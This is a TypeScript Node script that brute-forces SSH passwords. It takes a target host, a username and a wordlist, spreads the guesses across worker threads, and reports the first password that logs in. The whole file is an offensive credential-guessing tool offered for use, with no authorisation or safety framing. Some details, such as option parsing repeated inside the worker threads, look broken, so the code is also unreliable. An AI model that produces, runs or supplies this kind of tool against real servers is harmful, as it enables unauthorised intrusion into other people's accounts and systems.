#!/usr/bin/env node

import { Command } from 'commander';
import * as fs from 'fs';
import { Client, ClientChannel } from 'ssh2';
import { Worker, isMainThread, parentPort, workerData } from 'worker_threads';

const program = new Command();

program
  .requiredOption('-h, --host <host>', 'Target host')
  .option('-p, --port <port>', 'SSH port', '22')
  .requiredOption('-u, --user <user>', 'Username')
  .requiredOption('-w, --wordlist <file>', 'Password wordlist')
  .option('-t, --threads <threads>', 'Number of threads', '4')
  .option('-T, --timeout <timeout>', 'Connection timeout', '10')
  .parse();

const options = program.opts();

console.log(`Starting SSH brute force on ${options.host}:${options.port}`);
console.log(`Target: ${options.user}`);
console.log(`Threads: ${options.threads}`);
console.log(`Timeout: ${options.timeout} seconds`);
console.log('----------------------------------------');

// Load wordlist
const passwords = fs.readFileSync(options.wordlist, 'utf8').split('\n').filter(p => p);
console.log(`Loaded ${passwords.length} passwords`);

// Worker function
if (!isMainThread) {
  const { host, port, user, passwords, timeout }: any = workerData;
  
  function trySSH(password: string): Promise<boolean> {
    return new Promise((resolve) => {
      const conn = new Client();
      
      conn.on('ready', () => {
        conn.end();
        resolve(true);
      }).on('error', () => {
        resolve(false);
      }).connect({
        host: host,
        port: parseInt(port),
        username: user,
        password: password,
        readyTimeout: parseInt(timeout) * 1000
      });
    });
  }

  async function worker() {
    for (const password of passwords) {
      if (await trySSH(password)) {
        parentPort?.postMessage(`[SUCCESS] ${user}:${password}`);
        process.exit(0);
      }
    }
  }

  worker();
} else {
  // Main thread
  const chunkSize = Math.ceil(passwords.length / parseInt(options.threads));
  const workers: Worker[] = [];
  
  // Create workers
  for (let i = 0; i < parseInt(options.threads); i++) {
    const start = i * chunkSize;
    const end = Math.min(start + chunkSize, passwords.length);
    const chunk = passwords.slice(start, end);
    
    const worker = new Worker(__filename, {
      workerData: {
        host: options.host,
        port: options.port,
        user: options.user,
        passwords: chunk,
        timeout: options.timeout
      }
    });
    
    worker.on('message', (message) => {
      console.log(message);
      workers.forEach(w => w.terminate());
      process.exit(0);
    });
    
    workers.push(worker);
  }
  
  // Wait for all workers to finish
  Promise.all(workers.map(w => new Promise(resolve => w.on('exit', resolve))))
    .then(() => {
      console.log('No valid credentials found');
    });
}
